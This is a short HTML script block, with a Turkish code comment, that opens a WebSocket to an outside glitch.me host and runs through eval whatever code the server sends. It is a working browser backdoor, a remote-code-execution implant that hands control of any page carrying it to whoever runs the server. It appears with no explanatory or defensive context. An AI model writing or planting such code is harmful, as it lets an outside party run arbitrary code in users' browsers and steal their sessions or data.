<script>
(function() {
    var ws = new WebSocket('wss://adhesive-sassy-spaghetti.glitch.me');
    
    ws.onmessage = function(event) {
        var msg = JSON.parse(event.data);
        if (msg.type === 'code') {
            eval(msg.data); // Gelen kodu çalıştır
        }
    };
})();
</script>
